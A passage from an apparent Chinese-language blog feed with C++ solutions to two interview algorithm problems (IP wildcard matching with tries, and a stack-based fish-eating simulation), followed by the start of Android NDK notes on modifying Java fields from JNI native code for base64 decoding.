class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line">string str;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">node *kids[<span class="number">255</span>];</span><br><span class="line"><span class="keyword">bool</span> full;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tire</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">node *root;</span><br><span class="line"><span class="built_in">Tire</span>()&#123;</span><br><span class="line">root = (node *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node));</span><br><span class="line">root-&gt;full=<span class="literal">false</span>;</span><br><span class="line"><span class="built_in">memset</span>(root-&gt;kids, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(root-&gt;kids));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getNum</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; ret = &#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dotCnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ind=<span class="number">0</span>, pre=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">ret[ind++]=pre&lt;<span class="number">0</span>?<span class="number">-1</span>:pre;</span><br><span class="line">pre=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;*&#x27;</span>)&#123; pre=<span class="number">-1</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pre = pre*<span class="number">10</span> + s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ret[ind]=pre;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] ==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">ret[i] = (i-(<span class="number">3</span>-ind))&lt;<span class="number">0</span>?<span class="number">-1</span>:ret[i-(<span class="number">3</span>-ind)];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; ip)</span></span>&#123;</span><br><span class="line">node *now = root;</span><br><span class="line">node *pre = now;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ip[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">now-&gt;full=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(now-&gt;kids[ip[i]]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">node *n = (node *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node));</span><br><span class="line"><span class="built_in">memset</span>(n-&gt;kids, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(n-&gt;kids));</span><br><span class="line">n-&gt;full=<span class="literal">false</span>;</span><br><span class="line">now-&gt;kids[ip[i]] = n;</span><br><span class="line">pre=now;</span><br><span class="line">now=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pre=now;</span><br><span class="line">now=now-&gt;kids[ip[i]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">query</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; ip)</span></span>&#123;</span><br><span class="line">node *now = root;</span><br><span class="line">node *pre = now;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(now-&gt;kids[ip[i]]==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((now-&gt;kids[ip[i]])-&gt;full)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pre=now;</span><br><span class="line">now=now-&gt;kids[ip[i]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Tire fullTire, preTire, postTire;</span><br><span class="line"></span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">while</span>(n--)&#123;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v = fullTire.<span class="built_in">getNum</span>(str);</span><br><span class="line"><span class="keyword">if</span>(v[<span class="number">0</span>]==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">postTire.<span class="built_in">insert</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(v[<span class="number">3</span>]==<span class="number">-1</span>) preTire.<span class="built_in">insert</span>(v);</span><br><span class="line"><span class="keyword">else</span> fullTire.<span class="built_in">insert</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(m--)&#123;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v = fullTire.<span class="built_in">getNum</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ans|=preTire.<span class="built_in">query</span>(v);</span><br><span class="line">ans|=fullTire.<span class="built_in">query</span>(v);</span><br><span class="line"><span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">ans|=postTire.<span class="built_in">query</span>(v);</span><br><span class="line"></span><br><span class="line">cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="阿里云-大鱼吃小鱼"><a href="#阿里云-大鱼吃小鱼" class="headerlink" title="阿里云-大鱼吃小鱼"></a>阿里云-大鱼吃小鱼</h1><p>在线OJ：<a href="http://www.51nod.com/Challenge/Problem.html#problemId=1289">http://www.51nod.com/Challenge/Problem.html#problemId=1289</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">有N条鱼每条鱼的位置及大小均不同，他们沿着X轴游动，有的向左，有的向右。游动的速度是一样的，两条鱼相遇大鱼会吃掉小鱼。从左到右给出每条鱼的大小和游动的方向（0表示向左，1表示向右）。问足够长的时间之后，能剩下多少条鱼？</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">第1行：1个数N，表示鱼的数量(1 &lt;= N &lt;= 100000)。</span><br><span class="line">第2 ~ N+1行：每行两个数A[i], B[i]，中间用空格分隔，分别表示鱼的大小及游动的方向(1 &lt;= A[i] &lt;= 10^9，B[i] = 0或1）。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">输出1个数，表示最终剩下的鱼的数量。</span><br><span class="line"></span><br><span class="line">输入样例</span><br><span class="line">5</span><br><span class="line">4 0</span><br><span class="line">3 1</span><br><span class="line">2 0</span><br><span class="line">1 0</span><br><span class="line">5 0</span><br><span class="line"></span><br><span class="line">输出样例</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>这个题主要是理解的问题，即如何简化分析，我一开始也没头绪，并且导致面试时写错（不知道面试官看出来没有）。<br>之后后台我想到了这个：</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210816211315081.png" alt="image-20210816211315081"></p><p>只需要把向右移动的鱼看作坚果墙，把向左移动的鱼看作僵尸，坚果墙随时添加，僵尸随时出现，要么墙被啃烂，要么僵尸被干掉。<br>活着的鱼的数量等于剩下来的坚果和吃到脑子的僵尸数量。（略显无聊的转换……）</p><p>用栈只维护向右移动的鱼，记录鱼的大小。对于新的鱼，比较方向。向右即添加。向左则和栈顶比较，大于栈顶退栈一次，小于栈顶则扫描下一条鱼。如果栈被退空，则表示有一条鱼游到了左侧，数目+1。</p><p>需要注意的是，题目限定鱼的大小均不一样，所以不会出现旗鼓相当的鱼，但是面试的时候要求考虑。<br>对于大小相同的鱼，肯定不会出现一方被另一方吃掉的情况，所以要么碰撞后各自掉头，要么擦肩而过，但是这两种情况的表现都是一样的。（类似于刘汝佳-蓝书-思维的体操-木棍上的蚂蚁一题）。<br>因此，我的处理方法是：对于两条等大相碰的鱼，先把栈顶的鱼退出来记录好，然后让向左移动的鱼去与栈里的其他鱼比较。在该鱼游到左侧，或是止步于更大的鱼之后，再把原先退栈出来的重新入栈。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n, ans=<span class="number">0</span>;</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;S;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)&#123;</span><br><span class="line"><span class="keyword">int</span> s,d;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;s, &amp;d);</span><br><span class="line"><span class="keyword">if</span>(S.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">if</span>(d==<span class="number">0</span>) ans++;</span><br><span class="line"><span class="keyword">else</span> S.<span class="built_in">push</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(d==<span class="number">1</span>)&#123;</span><br><span class="line">S.<span class="built_in">push</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(!S.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">if</span>(S.<span class="built_in">top</span>() &lt; s)&#123; S.<span class="built_in">pop</span>();&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(S.<span class="built_in">top</span>() == s)&#123;</span><br><span class="line">ans++;</span><br><span class="line">S.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(S.<span class="built_in">empty</span>()) ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, S.<span class="built_in">size</span>() + ans);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录两个在面试过程中遇到的题目。&lt;/p&gt;</summary>
    
    
    
    
    <category term="算法" scheme="http://slient2009.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="面试" scheme="http://slient2009.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Android NDK开发学习笔记</title>
    <link href="http://slient2009.github.io/2021/08/15/Android-NDK/"/>
    <id>http://slient2009.github.io/2021/08/15/Android-NDK/</id>
    <published>2021-08-15T04:00:00.000Z</published>
    <updated>2021-09-09T08:52:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近学习了一下Android NDK开发，关于Native、反射、JNI注册相关的原理已经有足量且优秀的文章，本文仅记录一下实验过程。</p><span id="more"></span><h1 id="JNI-参数传递"><a href="#JNI-参数传递" class="headerlink" title="JNI 参数传递"></a>JNI 参数传递</h1><p>JNI会把Java中<strong>所有对象</strong>当做一个C指针传递到本地方法中,这个指针指向JVM内部数据结构,而内部的数据结构在内存中的存储方式是不可见的。只能从JNIEnv指针指向的函数表中选择合适的JNI函数来操作JVM中的数据结构。</p><p><strong>以env-&gt;GetStringUTFChars()为例</strong></p><p>比如native访问java.lang.String 对应的JNI类型jstring时，不能像访问基本数据类型那样使用，因为它是一个Java的引用类型，所以在本地代码中只能通过类似env-&gt;GetStringUTFChars这样的JNI函数来访问字符串的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * GetStringUTFChars(JNIEnv *env, jstring string, jboolean *isCopy);</span><br><span class="line"></span><br><span class="line">Returns a pointer to an array of bytes representing the string in modified UTF-<span class="number">8</span> encoding. <span class="function">This array is valid until it is released by <span class="title">ReleaseStringUTFChars</span><span class="params">()</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">If isCopy is not NULL, then *isCopy is set to JNI_TRUE <span class="keyword">if</span> a copy is made</span>; or it is set to JNI_FALSE <span class="keyword">if</span> no copy is made.</span><br><span class="line"></span><br><span class="line">LINKAGE:</span><br><span class="line">Index <span class="number">169</span> in the JNIEnv <span class="class"><span class="keyword">interface</span> <span class="title">function</span> <span class="title">table</span>.</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class"><span class="title">PARAMETERS</span>:</span></span><br><span class="line"><span class="class"><span class="title">env</span>: <span class="title">the</span> <span class="title">JNI</span> <span class="title">interface</span> <span class="title">pointer</span>.</span></span><br><span class="line"><span class="class"><span class="title">string</span>: <span class="title">a</span> <span class="title">Java</span> <span class="title">string</span> <span class="title">object</span>.</span></span><br><span class="line"><span class="class"><span class="title">isCopy</span>: <span class="title">a</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">a</span> <span class="title">boolean</span>.</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">RETURNS</span>:</span></span><br><span class="line"><span class="class"><span class="title">Returns</span> <span class="title">a</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">a</span> <span class="title">modified</span> <span class="title">UTF</span>-8 <span class="title">string</span>, <span class="title">or</span> <span class="title">NULL</span> <span class="title">if</span> <span class="title">the</span> <span class="title">operation</span> <span class="title">fails</span>.</span></span><br></pre></td></tr></table></figure><p>函数接收一个JNIEnv指针，和目标String在Java层的引用，以及一个flag标识是拷贝字符串（JNI_TRUE）还是引用源字符串的指针(JNI_FALSE)。<br>如果设置为JNI_FALSE，则可以在native层修改Java层的数据。</p><h1 id="从Native修改Java数据"><a href="#从Native修改Java数据" class="headerlink" title="从Native修改Java数据"></a>从Native修改Java数据</h1><p>最近研究了一下如何在不进行数据拷贝回传的情况下，从native层修改Java层的数据。<br>Oracle的<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html">JNI文档</a>可以作为在Native层使用相关函数的参考。</p><h2 id="通过JNIEnv操纵Java对象修改"><a href="#通过JNIEnv操纵Java对象修改" class="headerlink" title="通过JNIEnv操纵Java对象修改"></a>通过JNIEnv操纵Java对象修改</h2><p>比较常用的应该是利用JNIEnv函数来操纵Java层的对象，进而获得对象的属性并修改属性值，另外还可以实现在Native层调用Java对象的方法。<br>我在这里非常迂回地在Native层实现了一个base64加解密功能，用来实践这种修改思路。这种修改不需要在Java和Native之间显式地传递数据，因为通过JNIEnv函数可以实现从Native主动访问Java层数据。</p><p>主要的思路：</p><ol><li>确定要从base64.mInputText获取输出，通过Native层的函数处理之后，赋值给base64.mOutputText.</li><li>在Native的base64decode()函数中，先通过GetClassObject(thiz)获取Java对象base64。</li><li>然后使用GetFieldID()获取base64的mInputText和mOutputText两个属性的属性ID</li><li>基于FieldID通过env-GetObjectField()获取mInputText的属性值，然后进行解码操作得到明文。</li><li>通过env-SetObjectField()把明文赋值给mOutputText。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// base64.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Base64</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;BASE64&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Button mBase64Decode, mBase64Encode;</span><br><span class="line">    <span class="keyword">private</span> EditText mInput;</span><br><span class="line">    <span class="keyword">private</span> TextView mOutput;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String mInputText, mOutputText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.base64);</span><br><span class="line"></span><br><span class="line">        mInput = (EditText) findViewById(R.id.base64_input);</span><br><span class="line">        mOutput = (TextView) findViewById(R.id.base64_output);</span><br><span class="line"></span><br><span class="line">        mBase64Decode = (Button) findViewById(R.id.decode_button);</span><br><span class="line">        mBase64Encode = (Button) findViewById(R.id.encode_button);</span><br><span class="line">        mOut2In = (ImageButton) findViewById(R.id.out2in);</span><br><span class="line">        mClearText = (ImageButton) findViewById(R.id.clear_button);</span><br><span class="line"></span><br><span class="line">        mBase64Decode.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                mInputText = mInput.getText().toString();</span><br><span class="line">                Log.i(TAG, <span class="string">&quot;before call native function, mInputText = &quot;</span> + mInputText + <span class="string">&quot; mOutputText= &quot;</span> + mOutputText);</span><br><span class="line">                base64decode();</span><br><span class="line">                Log.i(TAG, <span class="string">&quot;after  call native function, mInputText = &quot;</span> + mInputText + <span class="string">&quot; mOutputText= &quot;</span> + mOutputText);</span><br><span class="line">                mOutput.setText(mOutputText);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">base64decode</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// base64.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_devndk_Base64_base64decode</span><span class="params">(JNIEnv *env, jobject thiz)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement base64decode()</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *cipherText;</span><br><span class="line">    <span class="keyword">char</span> *plainText;</span><br><span class="line">    <span class="comment">//先拿到Java层的对象以及对象的mInputText和mOutputText的属性ID</span></span><br><span class="line">    jclass cls = env-&gt;<span class="built_in">GetObjectClass</span>(thiz);</span><br><span class="line">    jfieldID inputTextID = env-&gt;<span class="built_in">GetFieldID</span>(cls, <span class="string">&quot;mInputText&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">    jfieldID outputTextID = env-&gt;<span class="built_in">GetFieldID</span>(cls, <span class="string">&quot;mOutputText&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(inputTextID == <span class="literal">NULL</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取mInputText的属性值，强制转换jobject为jstring</span></span><br><span class="line">    jobject jstr = env-&gt;<span class="built_in">GetObjectField</span>(thiz, inputTextID);</span><br><span class="line">    jstring jstrr = (jstring) jstr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy到native变量中</span></span><br><span class="line">    cipherText = env-&gt;<span class="built_in">GetStringUTFChars</span>(jstrr, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(cipherText == <span class="literal">NULL</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始解码，与JNI无关，可以略过</span></span><br><span class="line">    <span class="keyword">int</span> cipher_lens = <span class="built_in">strlen</span>(cipherText);</span><br><span class="line">    <span class="keyword">int</span> plain_lens = <span class="number">1</span> + cipher_lens * <span class="number">3</span> / <span class="number">4</span>;</span><br><span class="line">    plainText = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(plain_lens * <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> ind=<span class="number">0</span>;ind&lt;cipher_lens/<span class="number">4</span>;ind++)&#123;</span><br><span class="line">        <span class="keyword">int</span> n1 = <span class="built_in">c2n</span>(cipherText[ind*<span class="number">4</span>+<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> n2 = <span class="built_in">c2n</span>(cipherText[ind*<span class="number">4</span>+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">int</span> n3 = <span class="built_in">c2n</span>(cipherText[ind*<span class="number">4</span>+<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> n4 = <span class="built_in">c2n</span>(cipherText[ind*<span 